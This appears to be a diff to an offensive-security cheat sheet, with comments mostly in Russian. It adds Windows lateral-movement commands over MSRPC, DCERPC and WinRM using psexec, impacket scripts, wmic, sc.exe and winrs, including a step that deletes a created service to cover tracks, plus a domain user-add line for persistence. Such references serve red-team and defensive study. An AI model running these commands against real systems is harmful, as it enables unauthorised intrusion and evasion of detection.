@@ -254,8 +254,32 @@ Persistence
 Add new user: net user <username> <password> /add /domain; net group "<Group name>" <username> /add /domain
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## REMOTE CODE EXECUTION TOOLS:
-1. psexec (Sysinternals);
+MSRPC: использует 445 порт.
+1. psexec (Sysinternals); //psexec.exe -u admin \\target cmd
 2. wmic;
+3. psexec.py (impacket); //psexec.py -file somefile.txt admin@target (somefile.txt содержит код для выполнения)
+4. winexe; //winexe -U admin //target cmd
+5. smbexec.py (impacket); //smbexec.py -mode SHARE admin@target (В результате будет открыт доступ к интерактивной командной строке.)
+6. services.py (impacket):
+    services.py admin@target list - посмотреть список служб.
+    services.py admin@target create -name 1 -display 1 -path 'cmd arg1 arg2' - Создать новую службу, указав произвольную команду.
+    services.py admin@target start -name 1 - Запустить только что созданную службу.
+    services.py admin@target delete -name 1 - Замести следы и удалить ее.
+7. atexec.py/at.exe (impacket/windows internal service);
+8. reg.exe; //Удаленный доступ к реестру с правами на запись на самом деле нам дает RCE.
+
+DCERPC (Использует порты 135/TCP и 4915x/TCP, где 4915x — динамически назначаемые порты. Иногда могут использоваться порты из другого диапазона.)
+1. wmiexec.py; //wmiexec.py admin@target; //wmiexec.py -nooutput admin@target "mkdir c:\pwn".
+2. dcomexec.py; //dcomexec.py admin@target; //dcomexec.py -nooutput admin@10.0.0.64 "mkdir c:\123".
+3. wmis; //wmis -U admin //target "mkdir c:\pwn"/
+4. wmic.exe; //wmic.exe /user:username /password:s3cr3t /node:target process call create '"c:\123".
+5. sc.exe; //Назначение инструмента — удаленное управление службами и драйверами. 
+    sc.exe \\target create testservice binPath= \path\to\prog start= auto
+    sc.exe \\target start testservice
+
+WinRM
+1. Evil-WinRM
+2. WinRS.exe/PowerShell; //winrs.exe -u admin -r:target cmd.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## DCShadow
 
